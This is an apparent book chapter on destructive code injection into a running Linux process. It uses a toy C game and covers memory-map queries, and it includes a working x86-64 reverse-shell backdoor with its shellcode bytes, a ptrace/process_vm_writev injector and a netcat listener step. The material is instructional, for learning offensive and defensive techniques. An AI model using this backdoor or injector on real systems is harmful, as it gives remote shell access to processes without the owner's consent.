### Code Injection at Selected Position

The next destructive code injection technique we can use consists of writing our code over the code of the running program, taking over its functionality. In other words, the original program stops running its own code and starts running our own. There are a couple of ways of doing this, being the easiest the one we’ve already used in chapter 1: writing the code at `rip` position. However, real programs use libraries, which means that, whenever you take control of the application, you will rather be inside one of the libraries used by the program than in the main code of the application. So, in case our injected code makes use of the library we are destroying, it may fail in unforeseen ways.

> **Where did the process stop?**
>
> The `/proc/pid` pseudo file system provides us with a lot of information. We’ve already checked `/proc/pid/status` to check if we’re being tracked. That file will also tell us about the state of the process (running, sleeping,...) but there’s one more file especially important for our current discussion: `/proc/pid/syscall`, which will give you information about the current system call being executed. The file will show you the system call number followed by the values of all the parameters passed and finally the values of `rsp` and `rip`. This file can give you relevant information when applying some of the techniques without using `ptrace`, as for instance where the stack is or a good estimation of the base address of the text segment.

The main difference between what we’re trying to achieve now and what we did in the past is that the code we’re injecting now won’t return. Similar to what happens with our `execve` example in the previous section. Therefore, there’s no need to store the memory we overwrite and restore it afterwards. We just go ahead, write, and run. We’ll see in a future chapter how to do this keeping the original program running.

To illustrate this and the next techniques, let’s introduce a slightly more complex program than our simple counting test. Let’s write a mini game, a pretty bare-bones RPG game that I’ve named, in a display of originality, `picoRPG`. It’ll also be useful to talk about game hacking a bit later in this chapter. You can find the code below, roughly 50 lines of code in C with a few data structures and functions giving us enough material to play around.

```C
#include <stdio.h>
#include <stdlib.h>

#define NEXT_ROUND 0
#define COMBAT     1
#define DIE        2

struct entity_t { int  hp; int  xp;};
struct game_t {struct entity_t p; struct entity_t m; int a;} g;
void print_status (struct game_t *_g) {
  printf ("  PLAYER  HP:%d XP:%d\n  MONSTER HP:%d XP:%d\n", _g->p.hp, _g->p.xp, _g->m.hp, _g->m.xp);
}
void init_scene (struct game_t *_g) {
  _g->m.hp = 1 + rand() % 99;
  _g->m.xp = 2 + rand() % 8;
  puts ("---------------\n+ New Monster SPAWNED");
}
int game_step (struct game_t *_g) {
  if (_g->a == 'f') {puts ("! YOU FLY. YOU COWARD!"); _g->p.xp = _g->p.xp > 2 ? _g->p.xp -= 2 : 2; return NEXT_ROUND;}
  else if (_g->a == 'a') {
    int a1 = rand() % _g->m.xp;
    int a2 = rand() % _g->p.xp;
    printf ("+ MONSTER ATTACK %d\n+ PLAYER  ATTACK %d\n", a1, a2);
    _g->p.hp -= a1; _g->m.hp -= a2;
    print_status (_g);
    if (_g->p.hp <= 0) {puts ("! YOU DIED."); return DIE;}
    if (_g->m.hp <= 0) {puts ("! YOU WON. Moster DIED"); _g->p.hp=100; _g->p.xp+=10;return NEXT_ROUND;}
    return 1;
  }
  return COMBAT;
}
int main () {
  g.p.hp = 100; g.p.xp = 10;
  g.a = NEXT_ROUND;
  printf ("picoRPG 0.1\n-----------\n\n");
  while (g.a != DIE) {
    init_scene (&g);
    print_status (&g);
    g.a = COMBAT;
    while (g.a == COMBAT) {
      printf ("* (a)ttack (f)ly ?\n");
      g.a = getchar ();
      if (g.a!= '\n') getchar ();
      g.a = game_step (&g);
    }
  }
  return 0;
}
```

It is just a turn-based monster-slaying game. In each round, a monster is spawned with some health and experience points. The player starts with 100 HP (_Health Points_) and 10 XP (_eXperience Points_). Then, in each round, the player can choose to fight or fly. If the player flies, the experience is reduced, and therefore the strength of its future attacks. If it fights, the program goes into a loop producing attack points for the monster and player until one of them dies (health points reach 0). If the player dies, the game is over. If the monster dies, the player gains experience and a new monster is spawned. As a game, it’s crap, and it quickly evolves into an impossible-to-win or impossible-to-lose situation, but it’s good enough for our purposes, and it’s less than 50 lines, which is a plus for a book.

Be free to improve it by adding potions, magic, different weapons... You know the deal if you’ve ever played an RPG. Just remember to mention me if it finally becomes a successful game :).

As you can see, this program doesn’t do much, and most of the time will be waiting on `getchar`, waiting for user input, meaning that `rip` will point somewhere in libc every time we stop it. We may want to preserve the library because, for example, our injected code has to make use of library functions (for instance `getchar`), so we better don’t destroy them. Therefore, we better look for a different place to inject our code, but in order to have full control on where to inject our code at run-time, we need to combine the information in the ELF header (Program headers, symbols, etc.) with the current process memory map, which contains the correct memory addresses for that process after ASLR. Let’s start by getting the run-time process memory map.

### Process Memory Maps

The straightforward way to obtain a process memory map is reading the file `/proc/PID/maps`. This is pretty easy but may make your program big (use of `scanf` functions and other numeric conversion functions) in case you’re targeting, for example, an IoT device. For you to get an idea, this is how the memory map for our `count` example program looks like.

    $ cat /proc/1944065/maps
    00400000-00401000 r--p 00000000 fd:01 49676331   /opt/syscalls/ptrace/count
    00401000-00402000 rwxp 00001000 fd:01 49676331   /opt/syscalls/ptrace/count
    00402000-00403000 rw-p 00002000 fd:01 49676331   /opt/syscalls/ptrace/count
    7f152e1d9000-7f152e1dd000 r--p 00000000 00:00 0  [vvar]
    7f152e1dd000-7f152e1df000 r-xp 00000000 00:00 0  [vdso]
    7ffc2e03b000-7ffc2e05c000 rw-p 00000000 00:00 0  [stack]

Note that this is an ad-hoc ASM program, and that is why you just see 4 segments (plus the 3 last that are special and common to all processes). Regular programs have quite some extra mappings for libraries, heap, and anonymous memory. For completeness, this is how you interpret each line:

    StartAddr-EndAddr Permission FileOffset Device Inode File

The last 4 fields are usually 0 or empty (last field) for anonymous mapped memory, that is, memory not backed up by a file in disk. We’ll learn about this in the next chapter, don’t panic. So, parsing this file to get the relevant information about the different memory regions in a process is not specially difficult. I leave this as an exercise for the reader to practice string manipulation. _Spoiler: We’ll parse it later in the book._

> **BOX: VMA (Virtual Memory Area)**
>
> I believe we’ve mentioned VMAs before but haven’t defined them on purpose until now. We’ll go much deeper on this in the next chapter, but you may need a basic explanation now, in order to follow this section. So, `/proc/pid/maps` returns a list of the so-called VMAs or _Virtual Memory Areas_, which are the areas of virtual memory used by the process :). VMAs are an OS abstraction that defines memory areas in the process virtual memory address space that has the same properties like permissions, backing object, offset in the file, etc…
>
> This structure complements the page table that actually maps the virtual address (grouped in pages) to physical memory address; however, the VMAs are a higher-level abstraction that may represent many pages as one single unit.
>
> You can define VMAs using the `mmap` system call (that’s next chapter) where you ask for a block of memory of X bytes and some properties. The kernel will create a VMA for that memory region that may include multiple pages. The VMA main concept is that it represents contiguous memory regions with similar properties.

However, newer kernels have introduced an `ioctl` that allows us to get this information in a more program-friendly way. Actually, it allows us to run some limited kind of queries on the memory map of the selected process by filling the same data struct in which we’ll get the data back. This is common to many `ioctl` calls.

Let’s see a small program that reproduces the output (more or less) of a `cat /proc/PID/maps`:

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <linux/fs.h> // PROCMAP_QUERY ioctl

#define DIE(s) {perror(s); exit(1);}

int main (int argc, char *argv[]) {
  int                  fd;
  char                 path[1024];
  char                 name[1024];
  pid_t                pid;
  struct procmap_query q;

  pid = atoi (argv[1]);
  snprintf (path, 1024, "/proc/%d/maps", pid);
  printf ("> Testing %s\n", path);
  if ((fd = open (path, O_RDONLY)) < 0) DIE ("open:");

  memset (&q, 0, sizeof(q));
  q.size = sizeof(q);
  q.query_flags = PROCMAP_QUERY_COVERING_OR_NEXT_VMA;
  q.vma_name_addr = (long long)name; 
  q.vma_name_size = sizeof(name);

  int r;
  while ((r = ioctl (fd, PROCMAP_QUERY, &q)) == 0) {
    printf ("%p-%p %d %08lx %d:%d %ld %s\n", q.vma_start, q.vma_end, q.vma_flags,
	    q.vma_offset, q.dev_major, q.dev_minor, q.inode, name);

    // Prepare next iteration
    memset (name, 0, sizeof(name));
    q.query_addr = q.vma_end;
    q.vma_name_size = sizeof(name);

  }
  return 0;
}
```

As we will use an `ioctl`, the first thing we need is a file descriptor to apply that `ioctl`, so we first open `/proc/pid/maps` because that’s the kernel information we’ll be querying. After that, we prepare our query. The key element in this case is the `query_flags` field, that I set to `PROCMAP_QUERY_COVERING_OR_NEXT_VMA`. This will instruct the `ioctl` to search for the VMA that matches the value in `query_addr` or the next one if none matches. When we start the loop, we set that value to 0 (using `memset`) so we’ll start from querying the process VMAs from the lower address available.

The fields `name` and `name_size` are output fields, and we have to provide a buffer for the `ioctl` to store the file backing name for non-anonymous VMAs or the names associated with special areas like the stack or the heap.

Once set, we just run the `ioctl` in a loop until it returns an error. After each call, the `q` variable will be filled with the data for the `VMA` matching our query. In order to prepare for the next iteration, we need to update the `query_addr` to point to the end address of the current VMA so the `PROCMAP_QUERY_COVERING_OR_NEXT_VMA` will look for the next VMA. Also, note that you need to reset the `name` buffer otherwise it may return truncated responses or responses with characters from a previous query.

In the query setup, we can also use the following flags for querying the process memory map:

* `PROC_MAP_QUERY_VMA_READABLE` will return VMAs with read permission.
* `PROC_MAP_QUERY_VMA_WRITABLE` will return VMAs with write permission.
* `PROC_MAP_QUERY_VMA_EXECUTABLE` will return VMAs with executable permissions.
* `PROC_MAP_QUERY_VMA_SHARED` will return VMAs shared (non-anonymous ones).
* `PROC_MAP_QUERY_FILE_BACKED_VMA` will return file-backed VMAs.

So, depending on what you want to do, it may be useful to consider some of those flags. Overall, I’ll use the `/proc/PID/maps` file along the book as this `ioctl` is recent (at least at the time of this writing) and may not be available in some systems. In any case, it’s always good to know about alternative ways to get information, and this one is a pretty useful one.

As a last note, there is a program named `pmap` that actually dumps a process memory map given its PID, which may be convenient. It provides some interesting flags, but maybe `-x` and `-X` are the ones you may be interested in. Those flags provide extended information.

Now that we know how to read a process memory map, let’s get back to our code injection discussion.

### Our Payload

To go on, we need some kind of payload to be injected in the target process. I’ll choose a backdoor as it’s very small, simple, but a real thing anyways. You can get a complete description on how all this works and how to write them for different platforms in [Heavy Wizardry 101](https://nostarch.com/heavy-wizardry-101), so I’ll just write the code we’ll be using and show you how to extract the “shellcode” we’ll have to inject without further explanation.

```asm
	global _start
	
_start:
	;; $ nasm -f elf64 -o backdoor-x86-3.o backdoor-x86-3.asm && ld -o backdoor-x86-3 backdoor-x86-3.o
	;; $ sstrip backdoor-x86-3
	
	;; s = socket (PF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6);
	mov edi, 2		; PF_INET 2
	mov esi, 1		; SOCK_STREAM
	mov edx, 6      ; IPPROTO_TCP
	xor eax,eax
	add al, 41
	syscall	
	mov r8, rax		; FD should be 4 or 5
	
	mov rdi, r8
 	lea rsi, [rel addr]
	add  rdx,10
	xor eax,eax
	add al, 42
	syscall
	
	xor rsi, rsi
	call _dup2
	inc rsi
	call _dup2
	inc rsi
	call _dup2
	
	;; Exec
 	lea rdi, [rel shell]
	xor rsi,rsi
	xor rdx,rdx
	xor eax,eax
	add al, 59
	syscall

end:
	xor rdi, rdi
	xor eax,eax
	add al, 60
	syscall
	
_dup2:
	xor eax, eax
	add al, 33
	syscall
	ret
	
	addr dq 0x0100007f11120002
	shell db "/bin/bash",0

```

We can compile it and extract the "shellcode" with the following commands:

    $ nasm -f elf64 -o backdoor.o backdoor.x86.asm
    $ objcopy --dump-section .text=backdoor.bin backdoor

_NOTE: Check Heavy Wizardry 101 on how to port and compile this backdoor to other platforms than X86._

Finally, we can generate C code to include the payload in our programs using `xxd`. This way, we don’t have to add code for reading/parsing files.

    $ xxd -i backdoor.bin
    unsigned char backdoor_bin[] = {
      0xbf, 0x02, 0x00, 0x00, 0x00, 0xbe, 0x01, 0x00, 0x00, 0x00, 0xba, 0x06,
      0x00, 0x00, 0x00, 0x31, 0xc0, 0x04, 0x29, 0x0f, 0x05, 0x49, 0x89, 0xc0,
      0x4c, 0x89, 0xc7, 0x48, 0x8d, 0x35, 0x45, 0x00, 0x00, 0x00, 0x48, 0x83,
      0xc2, 0x0a, 0x31, 0xc0, 0x04, 0x2a, 0x0f, 0x05, 0x48, 0x31, 0xf6, 0xe8,
      0x2c, 0x00, 0x00, 0x00, 0x48, 0xff, 0xc6, 0xe8, 0x24, 0x00, 0x00, 0x00,
      0x48, 0xff, 0xc6, 0xe8, 0x1c, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x3d, 0x24,
      0x00, 0x00, 0x00, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2, 0x31, 0xc0, 0x04,
      0x3b, 0x0f, 0x05, 0x48, 0x31, 0xff, 0x31, 0xc0, 0x04, 0x3c, 0x0f, 0x05,
      0x31, 0xc0, 0x04, 0x21, 0x0f, 0x05, 0xc3, 0x02, 0x00, 0x12, 0x11, 0x7f,
      0x00, 0x00, 0x01, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68,
      0x00
    };
    unsigned int backdoor_bin_len = 121;

I won’t include this in the examples in the next sections to save real estate in the book, but every time you see a reference to `backdoor_bin`, I’m referring to this variable that has to be added to the source code of that program.

Now that we’ve all the bits and pieces we need, let’s get started!

### Injecting code in `main`

From this point on, even when the programs we’ll be writing are very simple, they start to grow in size because we’ve to do quite some steps. For example, we’ve to get the memory map of the process, which, as we’ve just seen, is a quite simple task, but if we include that code on all the examples, the book will become an endless listing of repeating code. Therefore, in the next sections I’ll be extracting many of the information I need from external tools rather than integrating all the steps in the examples. This way, the code size remains manageable, and we can focus on the technique. Don’t worry, I’ll always show you how to do anything we do using external tools in your own programs, in case you want to write your own full versions.

Said that, let’s destructively inject code in the `main` function. What we’re going to do is:

* Find some address in the `main` function which will eventually be executed. Ideally, some part of the code fired by a user action.
* Inject our code at that place, overwriting the existing one. This is the destructive part. The original program will stop working normally because we’ve destroyed that part of the code.
* Wait until the program passes through the selected address and our code gets executed.

First, let’s choose a good location in the `main` function of our simple game to do the injection. You can try with other locations later and do your own experiments. Sometimes you get surprises, and things don't work as you expected. Figuring out what’s going on ends up being a great exercise and a lot of fun. Let’s take a look to the `main` function.

    $ objdump -d game | grep -A40 "<main>:"
    0000000000001369 <main>:
        1369:	55                   	push   %rbp
        136a:	48 89 e5             	mov    %rsp,%rbp
        136d:	c7 05 c9 2c 00 00 64 	movl   $0x64,0x2cc9(%rip)        # 4040 <g>
        1374:	00 00 00
        1377:	c7 05 c3 2c 00 00 0a 	movl   $0xa,0x2cc3(%rip)        # 4044 <g+0x4>
        137e:	00 00 00
        1381:	c7 05 c5 2c 00 00 00 	movl   $0x0,0x2cc5(%rip)        # 4050 <g+0x10>
        1388:	00 00 00
        138b:	48 8d 05 32 0d 00 00 	lea    0xd32(%rip),%rax        # 20c4 <_IO_stdin_used+0xc4>
        1392:	48 89 c7             	mov    %rax,%rdi
        1395:	e8 96 fc ff ff       	call   1030 <puts@plt>
        139a:	eb 74                	jmp    1410 <main+0xa7>
        139c:	48 8d 05 9d 2c 00 00 	lea    0x2c9d(%rip),%rax        # 4040 <g>
        13a3:	48 89 c7             	mov    %rax,%rdi
        13a6:	e8 01 fe ff ff       	call   11ac <init_scene>
        13ab:	48 8d 05 8e 2c 00 00 	lea    0x2c8e(%rip),%rax        # 4040 <g>
        13b2:	48 89 c7             	mov    %rax,%rdi
        13b5:	e8 af fd ff ff       	call   1169 <print_status>
        13ba:	c7 05 8c 2c 00 00 01 	movl   $0x1,0x2c8c(%rip)        # 4050 <g+0x10>
        13c1:	00 00 00
        13c4:	eb 3f                	jmp    1405 <main+0x9c>
        13c6:	48 8d 05 10 0d 00 00 	lea    0xd10(%rip),%rax        # 20dd <_IO_stdin_used+0xdd>
        13cd:	48 89 c7             	mov    %rax,%rdi
        13d0:	e8 5b fc ff ff       	call   1030 <puts@plt>
        13d5:	e8 76 fc ff ff       	call   1050 <getchar@plt>
        13da:	89 05 70 2c 00 00    	mov    %eax,0x2c70(%rip)        # 4050 <g+0x10>
        13e0:	8b 05 6a 2c 00 00    	mov    0x2c6a(%rip),%eax        # 4050 <g+0x10>
        13e6:	83 f8 0a             	cmp    $0xa,%eax
        13e9:	74 05                	je     13f0 <main+0x87>
        13eb:	e8 60 fc ff ff       	call   1050 <getchar@plt>
        13f0:	48 8d 05 49 2c 00 00 	lea    0x2c49(%rip),%rax        # 4040 <g>
        13f7:	48 89 c7             	mov    %rax,%rdi
        13fa:	e8 1d fe ff ff       	call   121c <game_step>
        13ff:	89 05 4b 2c 00 00    	mov    %eax,0x2c4b(%rip)        # 4050 <g+0x10>
        1405:	8b 05 45 2c 00 00    	mov    0x2c45(%rip),%eax        # 4050 <g+0x10>
        140b:	83 f8 01             	cmp    $0x1,%eax
        140e:	74 b6                	je     13c6 <main+0x5d>
        1410:	8b 05 3a 2c 00 00    	mov    0x2c3a(%rip),%eax        # 4050 <g+0x10>
        1416:	83 f8 02             	cmp    $0x2,%eax
        1419:	75 81                	jne    139c <main+0x33>

Let’s aim for the instruction just after the last call to `getchar`, which means that our code will be executed just after the user playing the game presses any key during the combat loop. That’s address `0x13f0`. If you check the beginning of a complete `objdump`, you’ll see that the `.text` section starts at `0x1000`, so the offset to our instruction of interest with regards to the beginning of the `.text` segment is `0x3f0`. Alternatively, you can check the starting (relative) address of the code segment using `readelf -l`.

To figure out the actual run-time address we’ll have to patch, we need to check the running process memory map once again. Let’s run the game in a console and get its PID (`ps ax | grep game`). Now we can check the process memory map. For me, it looks like this:

    55b16c502000-55b16c503000 r--p 00000000 fd:01 49676378  /opt/syscalls/process_vm/game
    55b16c503000-55b16c504000 r-xp 00001000 fd:01 49676378  /opt/syscalls/process_vm/game
    55b16c504000-55b16c505000 r--p 00002000 fd:01 49676378  /opt/syscalls/process_vm/game
    55b16c505000-55b16c506000 r--p 00002000 fd:01 49676378  /opt/syscalls/process_vm/game
    55b16c506000-55b16c507000 rw-p 00003000 fd:01 49676378  /opt/syscalls/process_vm/game
    55b16ec95000-55b16ecb6000 rw-p 00000000 00:00 0         [heap]
    7fc2207ea000-7fc2207ed000 rw-p 00000000 00:00 0
    7fc2207ed000-7fc220815000 r--p 00000000 fd:01 50080079  /usr/lib/x86_64-linux-gnu/libc.so.6
    7fc220815000-7fc220978000 r-xp 00028000 fd:01 50080079  /usr/lib/x86_64-linux-gnu/libc.so.6
    7fc220978000-7fc2209ce000 r--p 0018b000 fd:01 50080079  /usr/lib/x86_64-linux-gnu/libc.so.6
    7fc2209ce000-7fc2209d2000 r--p 001e0000 fd:01 50080079  /usr/lib/x86_64-linux-gnu/libc.so.6
    7fc2209d2000-7fc2209d4000 rw-p 001e4000 fd:01 50080079  /usr/lib/x86_64-linux-gnu/libc.so.6
    7fc2209d4000-7fc2209e1000 rw-p 00000000 00:00 0
    7fc2209ff000-7fc220a01000 rw-p 00000000 00:00 0
    7fc220a01000-7fc220a05000 r--p 00000000 00:00 0         [vvar]
    7fc220a05000-7fc220a07000 r-xp 00000000 00:00 0         [vdso]
    7fc220a07000-7fc220a08000 r--p 00000000 fd:01 50080073  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    7fc220a08000-7fc220a30000 r-xp 00001000 fd:01 50080073  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    7fc220a30000-7fc220a3b000 r--p 00029000 fd:01 50080073  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    7fc220a3b000-7fc220a3d000 r--p 00034000 fd:01 50080073  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    7fc220a3d000-7fc220a3e000 rw-p 00036000 fd:01 50080073  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    7fc220a3e000-7fc220a3f000 rw-p 00000000 00:00 0
    7fffa3af6000-7fffa3b17000 rw-p 00000000 00:00 0         [stack]

The main code is loaded at address `0x55b16c503000` for this specific execution. Remember that ASLR will change it on each run. The instruction we are interested in is at `0x55b16c5033f0`. That’s the address where we want to write our code. So let’s slightly modify our previous program to get this address as an argument and inject the code in the game.

_NOTE: As I said before, you can integrate the extraction of the process base address in the program below, but as you already know how to do that, I’ll just pass the address I’m interested in as a parameter._

```C
int main (int argc, char *argv[]) {
  struct user_regs_struct  regs, old_regs;
  int                      status;
  pid_t                    pid = atoi(argv[1]);
  uint64_t                 addr = atol(argv[2]);
  struct iovec             local1[1], remote[1];
  uint64_t                 v, pagesize = sysconf (_SC_PAGESIZE);

  // --------------------------------------
  // Prepare to use process_vm_writev
  if (ptrace (PTRACE_SEIZE,     pid, 0, 0) < 0) DIE("PTRACE_SEIZE:");
  if (ptrace (PTRACE_INTERRUPT, pid, 0, 0) < 0) DIE ("PTRACE_INTERRUPT:");
  wait (&status);
  if (ptrace (PTRACE_GETREGS,   pid, 0, &old_regs) < 0)  DIE ("PTRACE_GETREGS:");

  memcpy (&regs, &old_regs, sizeof(regs));
  // We need to poke the syscall to change memory permissions at target
  if ((v = ptrace (PTRACE_PEEKTEXT, pid, regs.rip, 0)) < 0)  DIE ("PTRACE_PEEKTEXT:");
  if (ptrace (PTRACE_POKETEXT, pid, regs.rip, 0x000000000000050f) < 0)  DIE ("PTRACE_POKETEXT:");
  inject_syscall (pid, &regs, 10,
		  addr & ~(pagesize - 1), pagesize, PROT_WRITE | PROT_READ | PROT_EXEC,0);
  // ----------------------------
  local1[0].iov_base = backdoor_bin;
  local1[0].iov_len  = backdoor_bin_len;
 
  remote[0].iov_base = (void*) addr; // Copy just after syscall
  remote[0].iov_len  = backdoor_bin_len;
  process_vm_writev (pid, local1, 1, remote, 1, 0);

  if (ptrace (PTRACE_POKETEXT, pid, old_regs.rip, v) < 0)  DIE ("PTRACE_POKETEXT:");
  if (ptrace (PTRACE_SETREGS, pid, 0, &old_regs) < 0)  DIE ("PTRACE_SETREGS1:");
  // Let the tracee continue
  if (ptrace (PTRACE_DETACH,   pid,        0,         0) < 0) DIE ("PTRACE_DETACH:");
  return 0;	    
}
```


> **TECHNIQUE**: Destructive code injection in the `main` function
>
>_Code injection_
>
>Use `ptrace` and `process_vm_writev` system calls to inject your shellcode in the `main` function at an address which will be eventually executed. Then sit and wait for the program to execute its code for us. This technique doesn't require register modification.

Nothing really special here. Just note that this time we need to restore the `syscall` instruction we’ve injected, because that is happening somewhere else in the process memory, not the `main` function. It’s likely in LibC so we’ve to ensure that the code gets safe back to `main` where our injected code is executed.

We’re done, let’s try it. First, we’ll run `nc` in one console, and the game in another console.

    $ ./game                     # Console 1
    $ ./nc -v -l $((0x1211))     # Console 2

In a third console, we run our program, assuming the values we’ve used in the examples along this section, it’d look like:

    $ ./process_vm4 2388627  $((0x559c574063f0))  # Console 3. process_vm4 PID Address

After running our program, nothing happens, but whenever we press any key on the game to get out of the `getchar()` function, we’ll see a shell connection in our netcat window!

We have done this on `main`, but we could just put the code in any other place, for instance in the `game_step` function that gets executed on every main loop. In that case, we just get the address of the function by dumping the symbols, if the program is not stripped, or locating the `call` instructions in the `main` function ASM code. Once we get the address to the function, everything would work exactly the same, but using that address as the second parameter.
